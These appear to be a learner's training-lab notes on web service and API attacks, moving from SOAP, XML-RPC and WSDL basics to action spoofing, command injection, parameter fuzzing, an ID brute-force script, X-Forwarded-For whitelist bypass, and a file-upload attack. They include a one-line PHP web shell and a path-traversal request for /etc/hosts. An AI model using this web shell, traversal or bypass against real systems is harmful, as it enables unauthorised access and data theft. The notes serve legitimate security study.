- API means : application programming interface .
    
    which is a set of ruless s that enables data transmition between two different softwares
    
    api ⇒ mainly about tranfering data between softwares .
    
    the mechanism of how it works : ?
    
    requester software asks the api of the responser software about the informations the requester wants .
    
    and when the api see the request it response for it according to it’s programming Logic .
    
    so api is specifing the interface by which the data tranfer happens .
    
- API & web service : they are two quite similar , but the major difference between api and web service
- [ API ] _________________vs_________________ [ Web services]
    
    ||API|web services|
    |---|---|---|
    |branching|it is the whole api|it is a type of api|
    |availabiltiy|dont need network|need network|
    |access viability|allow external access usually|rarely allow external access|
    |majorly data encoding form ( usually not always)|JSON|XML|
    
      
    
- what is the approaches ( techniques) and technologies that web service uses?
    - there is multiple approaches and technologies that web service uses ..
        1. `XML-RPC` uses xml for encoding /decoding the remote procedure call إجراء اتصال عن RPC بعد
            
            and the parameter of the transport is HTTP usually the transport choice .
            
            ```
              --> POST /RPC2 HTTP/1.0
              User-Agent: Frontier/5.1.2 (WinNT)
              Host: betty.userland.com
              Content-Type: text/xml
              Content-length: 181
            
              <?xml version="1.0"?>
              <methodCall><methodName>examples.getStateName</methodName><params><param><value><i4>41</i4></value></param></params></methodCall>
            
              <-- HTTP/1.1 200 OK
              Connection: close
              Content-Length: 158
              Content-Type: text/xml
              Date: Fri, 17 Jul 1998 19:55:08 GMT
              Server: UserLand Frontier/5.1.2-WinNT
            
              <?xml version="1.0"?>
              <methodResponse><params><param><value><string>South Dakota</string></value></param></params></methodResponse>
            ```
            
            as we can notice and see in the xml rpc technique for the web service :
            
            first /RPC2 this is the place that the post wents to
            
            the using protocol is http
            
            content type : text/xml
            
            and finally the code that we are sending via the post is xml code
            
            it is simply answering the request of getstate name and it gives it the name that is similar to what api does but as we said there is small differences between network service and api mainly web service is a part of the api that needs network and depend on using xml instead of json and is not accessable via any one .
            
        2. JSON-RPC:
            
            uses JSON to invoke( bring ) functionality of the remote procedure call as we see in the request :
            
            ```
             --> POST /ENDPOINT HTTP/1.1
               Host: ...
               Content-Type: application/json-rpc
               Content-Length: ...
            
              {"method": "sum", "params": {"a":3, "b":4}, "id":0}
            
              <-- HTTP/1.1 200 OK
               ...
               Content-Type: application/json-rpc
            
               {"result": 7, "error": null, "id": 0}
            ```
            
            we can notice from the request :
            
            the post is to /ENDPOINT which is said in API
            
            it is using json in the content type so it is API
            
        3. SOAP ( simple object access protocol )
            - Simple Object Access Protocol (SOAP) is a **lightweight  
                XML-based protocol that is used for the exchange of information in  
                decentralized, distributed application environments**. You can  
                transmit SOAP messages in any way that the applications require, as long  
                as both the client and the server use the same method.
            - SOAP also uses XML but provides more functionalities than XML-RPC
            - A Web Services Definition Language (WSDL) declaration is optional. WSDL specifies how a SOAP service can be used. Various lower-level protocols (HTTP included) can be the transport.
            - Anatomy of a SOAP Message
                
                - `soap:Envelope`: (Required block) Tag to differentiate SOAP from normal XML. This tag requires a `namespace` attribute.
                - `soap:Header`: (Optional block) Enables SOAP’s extensibility through SOAP modules.
                - `soap:Body`: (Required block) Contains the procedure, parameters, and data.
                - `soap:Fault`: (Optional block) Used within `soap:Body` for error messages upon a failed API call.
                    - Code: http
                        
                        ```
                          --> POST /Quotation HTTP/1.0
                          Host: www.xyz.org
                          Content-Type: text/xml; charset = utf-8
                          Content-Length: nnn
                        
                          <?xml version = "1.0"?>
                          <SOAP-ENV:Envelope
                            xmlns:SOAP-ENV = "http://www.w3.org/2001/12/soap-envelope"SOAP-ENV:encodingStyle = "http://www.w3.org/2001/12/soap-encoding"><SOAP-ENV:Body xmlns:m = "http://www.xyz.org/quotations"><m:GetQuotation><m:QuotationsName>MiscroSoft</m:QuotationsName></m:GetQuotation></SOAP-ENV:Body></SOAP-ENV:Envelope>
                        
                          <-- HTTP/1.0 200 OK
                          Content-Type: text/xml; charset = utf-8
                          Content-Length: nnn
                        
                          <?xml version = "1.0"?>
                          <SOAP-ENV:Envelope
                           xmlns:SOAP-ENV = "http://www.w3.org/2001/12/soap-envelope"SOAP-ENV:encodingStyle = "http://www.w3.org/2001/12/soap-encoding"><SOAP-ENV:Body xmlns:m = "http://www.xyz.org/quotation"><m:GetQuotationResponse><m:Quotation>Here is the quotation</m:Quotation></m:GetQuotationResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
                        ```
                        
                
                Similar API specifications/protocols exist, such as Remote Procedure Call (RPC), SOAP, REST, gRPC, GraphQL, etc.
                
                  
                

## Web services Description Language:

- WSDL : WEB SERVCIE DESCRIPTIOON LANGUAGE
- usually the wsdl file should not be accessable by normal users ( for security) .
- but we amy find the wsdl file by Fuzzing . `KareemAlsadeq@htb[/htb]$ dirb http://<TARGET IP>:3002` via dirb tool this time .
- 💡
    
    when we found that there is a website file called wsdl in the website but when we tried to [http://ip:3002](http://ip:3002)/wsdl we tried to curl it and we got an empty response and when we open it we get empty page so we will not close it and go away we will try to see if there is a prameter that if we used with it we may get a full response that may reveal what we are looking for which is the wsdl content web service directory language . we will use the word list of /Seclist-master/Discovery/burp-paramter-names.txt to search for parameters
    
      
    
    `http://<TARGET IP>:3002/wsdl?FUZZ`
    
      
    
    and finally we found that wsdl is the parameter for the wsdl file
    
    `http://<TARGET IP>:3002/wsdl?wsdl`
    
    and then we got the content
    
    ![[Screenshot_from_2023-10-23_15-39-19.png]]
    

We identified the SOAP service's WSDL file!

**Note**: WSDL files can be found in many forms, such as `/example.wsdl`, `?wsdl`, `/example.disco`, `?disco` etc. [DISCO](https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/february/xml-files-publishing-and-discovering-web-services-with-disco-and-uddi) is a Microsoft technology for publishing and discovering Web Services.

  

okay but we dont understand the things in the wsdl file so lets explain them ..

### DEFINITION

<wsdl:definitions target namespace=”http://tempuri.org/”

we can find the root element of all wsdl files in the definition of the wsdl .

all names used across wsdl document are declared

and all other service element are defined .

- Code: xml
    
    ```
    <wsdl:definitions targetNamespace="http://tempuri.org/"<wsdl:types></wsdl:types><wsdl:message name="LoginSoapIn"></wsdl:message><wsdl:portType name="HacktheBoxSoapPort"><wsdl:operation name="Login"></wsdl:operation></wsdl:portType><wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort"><wsdl:operation name="Login"><soap:operation soapAction="Login" style="document"/><wsdl:input></wsdl:input><wsdl:output></wsdl:output></wsdl:operation></wsdl:binding><wsdl:service name="HacktheboxService"></wsdl:service></wsdl:definitions>
    ```
    

### Data Types :

- the data types to be used in the exchanged msgs.
- - Code: xml
        
        ```
        <wsdl:types><s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/"><s:element name="LoginRequest"><s:complexType><s:sequence><s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/><s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/></s:sequence></s:complexType></s:element><s:element name="LoginResponse"><s:complexType><s:sequence><s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/></s:sequence></s:complexType></s:element><s:element name="ExecuteCommandRequest"><s:complexType><s:sequence><s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/></s:sequence></s:complexType></s:element><s:element name="ExecuteCommandResponse"><s:complexType><s:sequence><s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/></s:sequence></s:complexType></s:element></s:schema></wsdl:types>
        ```
        

### Messages:

- defines input and output operations that the web services supports

## Operation :

- defines the available SOAP actions alongside the encoding of each message .

## Port Type:

- Encapsulates every possible input and output message into an operation more specifically it defines the web service .

  

  

---

  

  

  

It seems you've provided a detailed set of notes on SOAP Action Spoofing, Command Injection, Information Disclosure through Fuzzing and SQL, and Arbitrary File Upload attacks. I can help you organize these notes and refine them for better clarity and presentation in Notion.

Here's a cleaner and more organized version suitable for adding into Notion:

---

## **SOAP Action Spoofing**:

- SOAP messages sent to the SOAP service generally include the operation and its related parameters.
- The operation typically resides in the SOAP message's body's first child element.
- If the request uses the HTTP protocol, an additional header can be added called "SOAPAction".
- A web service identifies the operation within the SOAP body using this header.
- Vulnerability arises if the web service determines the operation based solely on the SOAP Action attribute. This may lead to SOAP Action spoofing.

```
xml
```

```
<s:element name="ExecuteCommandRequest">
   <s:complexType>
       <s:sequence>
           <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
       </s:sequence>
   </s:complexType>
</s:element>

```

**Python Script for SOAP Request**:

```
python
```

```
# client.py

import requests
# ... (rest of the code)

```

---

## **Command Injection**:

- This allows command execution directly on the backend server.
- It's especially dangerous if the web service takes user-controlled input for executing commands.
- The goal is to manipulate the data to bypass and execute malicious commands.

**PHP Code Example**:

```
php
```

```
# ping-server.php
<?php
# ... (rest of the code)
?>

```

---

## **Information Disclosure**:

### Through Fuzzing:

- Information disclosure can occur due to API misconfigurations.
- Fuzzing helps uncover this.
- Consider using `ffuf` and the `burp parameter-names.txt` for parameter fuzzing.

### Through SQL:

- APIs can be vulnerable to SQL Injection.
- Use SQL payloads to test and exploit.

---

## **Arbitrary File Upload**:

- Similar to basic file uploads, but malicious files (like RCE) are uploaded.
- After uploading, they're executed to take control of the backend server.

**PHP File Upload via API to RCE**:

```
php
```

```
# backdoor.php

<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>

```

**Python Script to Leverage the Web Shell**:

```
python
```

```
# web_shell.py
import argparse, time, requests, os
# ... (rest of the code)

```

---

  

## Information disclosure with ( twist of SQLI )

- python script to fetch the request from the the url we put and also use the ID parameter to change the request send
    
    We notice a similar response size in every request. This is because  
    supplying any parameter will return the same text, not an error like  
    404.
    
    Let us filter out any responses having a size of 19, as follows.
    
    ```
    KareemAlsadeq@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19
            /'___\  /'___\           /'___\
           /\ \__/ /\ \__/  __  __  /\ \__/
           \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
             \ \_\   \ \_\  \ \____/  \ \_\
              \/_/    \/_/   \/___/    \/_/
    
           v1.3.1 Kali Exclusive <3
    ________________________________________________
    
     :: Method           : GET
     :: URL              : http://<TARGET IP>:3003/?FUZZ=test_value
     :: Wordlist         : FUZZ: /home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403,405
     :: Filter           : Response size: 19
    ________________________________________________
    
    :: Progress: [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 id                      [Status: 200, Size: 38, Words: 7, Lines: 1]
    :: Progress: [57/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
    :: Progress: [187/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
    :: Progress: [375/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
    :: Progress: [567/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
    :: Progress: [755/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
    :: Progress: [952/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
    :: Progress: [1160/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:
    :: Progress: [1368/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:
    :: Progress: [1573/2588] :: Job [1/1] :: 1720 req/sec :: Duration: [0:00:01] :: Error
    :: Progress: [1752/2588] :: Job [1/1] :: 1437 req/sec :: Duration: [0:00:01] :: Error
    :: Progress: [1947/2588] :: Job [1/1] :: 1625 req/sec :: Duration: [0:00:01] :: Error
    :: Progress: [2170/2588] :: Job [1/1] :: 1777 req/sec :: Duration: [0:00:01] :: Error
    :: Progress: [2356/2588] :: Job [1/1] :: 1435 req/sec :: Duration: [0:00:01] :: Error
    :: Progress: [2567/2588] :: Job [1/1] :: 2103 req/sec :: Duration: [0:00:01] :: Error
    :: Progress: [2588/2588] :: Job [1/1] :: 2120 req/sec :: Duration: [0:00:01] :: Error
    :: Progress: [2588/2588] :: Job [1/1] :: 2120 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
    ```
    
    It looks like _id_ is a valid parameter. Let us check the response when specifying _id_ as a parameter and a test value.
    
    ```
    KareemAlsadeq@htb[/htb]$ curl http://<TARGET IP>:3003/?id=1
    [{"id":"1","username":"admin","position":"1"}]
    ```
    
    Find below a Python script that could automate retrieving all information that the API returns (save it as `brute_api.py`).
    
    Code: python
    
    ```
    import requests, sys
    
    def brute():
        try:
            value = range(10000)
            for val in value:
                url = sys.argv[1]
                r = requests.get(url + '/?id='+str(val))
                if "position" in r.text:
                    print("Number found!", val)
                    print(r.text)
        except IndexError:
            print("Enter a URL E.g.: http://<TARGET IP>:3003/")
    
    brute()
    ```
    
    - We import two modules _requests_ and _sys_. _requests_ allows us to make HTTP requests (GET, POST, etc.), and _sys_ allows us to parse system arguments.
    - We define a function called _brute_, and then we define a variable called _value_ which has a range of _10000_. _try_ and _except_ help in exception handling.
    - _url = sys.argv[1]_ receives the first argument.
    - _r = requests.get(url + '/?id='+str(val))_ creates a response object called _r_ which will allow us to get the response of our GET request. We are just appending _/?id=_ to our request and then _val_ follows, which will have a value in the specified range.
    - _if "position" in r.text:_ looks for the _position_ string in the response. If we enter a valid ID, it will return the position and other information. If we don't, it will return _[]_.
    
    The above script can be run, as follows.
    
    ```
    KareemAlsadeq@htb[/htb]$ python3 brute_api.py http://<TARGET IP>:3003
    Number found! 1
    [{"id":"1","username":"admin","position":"1"}]
    Number found! 2
    [{"id":"2","username":"HTB-User-John","position":"2"}]
    ...
    ```
    
    one thing that caught my attention :
    
    if there are a rate limit in the server we are attacking then we always can bypass it by headers
    
    does they mean by adding headers ??
    
    ans:
    
    💡
    
    X-Forward-For: 127.0. 0.1" header is used, it **allows to bypass restrictions of the web application and access endpoints that are restricted otherwise**
    
      
    
    and what chatgpt says about ( x forward for ) header
    
    :
    
    💡
    
    the x forward for header is usually used for identifying the originating ip address of a client connectingg to a web srver through an http proxy or load balancer in another word it just says to the server what is the ip of the attacker , so if we imported the x-forward-for header with 127.1 which is the local ip of any thing that runs on so this will potentially lead to us to aschieve places that we shouldnot aschieve and we may be able to bypass security restrictions .
    

Lets get back to our module : : : >

- If there is a rate limit in place, you can always try to bypass it through headers such as X-Forwarded-For, X-Forwarded-IP, etc., or use proxies. These headers have to be compared with an IP most of the time. See an example below.

lets see an example of how its php code works …

- Code: php
    
    ```
    <?php
    $whitelist = array("127.0.0.1", "1.3.3.7");
    if(!(in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)))
    {
        header("HTTP/1.1 401 Unauthorized");
    }
    else
    {
      print("Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!");
    }
    ```
    
    the problem in this php server script is :
    
    it takes the x-forward-for header’s ip you porvide in and then compare it with the white listed ips so this is a bad script and vulnerable to the
    
    bypassing of x-forward-for header
    
      
    
      
    
      
    
    as we said in the h2 title here → information disclosure through sql injection can happen in the parameter we are mentioning i mean it sqli can affect APIs as well lets try submitting classic sqli payloads in the id parameter
    
      
    
      
    
    ## Arbitrary file upload :
    
    - what is arbitrary file uploads ? ans: maliciouse file upload , execute arbitrary commands on the backend server , take control ov3er the entire server , arbitrary file upload vulenrabilities affect web applications and ap8is alike .

  

## PHP file upload via API to RCE

so we are taking about uploading a php file to the backend server via the api to achieve remote code execution .

we can say that they really made the normal file upload attack and just uploaded a php file to get RCE

  

## Local file inclusion ( LFI )

what is local file inclusion again ??

ans : it is just reading the content of some important internal files that arenot allowed to be readden and this happens because of a the LFI vulenrability .

now we are going to talk about an API that contains the same vulenrablitiy

when searching ( fuzzing ) for api end points we used a list called common-api-endpoints-mazen160.txt list ,

as follows

```
ffuf -w ".../common-api-endpoints-mazen160.txt:FUZZ"  -u "http://<target ip > :3000/api/FUZZ "
```

WE FOUND

/api/FUZZ ——→ /api/download is valid api endpoint that the requests goes to and we get the response from .

we need to specify a file in that api endpoint we found but we dont have any knowledge about the stored files or their naming shceme . we can try mountying a local file inclusion ( LFI ) attack , though .

```
curl "http://<targertip>:3000/api/download/../../../../etc/hosts"
```

when he used it ../../ we use instead of it the url version which is ..%2f..%2f

and when we used that command we got

127.0.0.1 localhost

127.0.1.1 nix01-websvc

the following lines are desirable for ipv6 capable hosts

```
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

and yes we were able to use LFI in the api endpoint we found by checking the etc/hosts

so just remeber there is a directory called etc contains hosts directory and we can use them when exploiting a LFI vulenerabililty in api endpoints .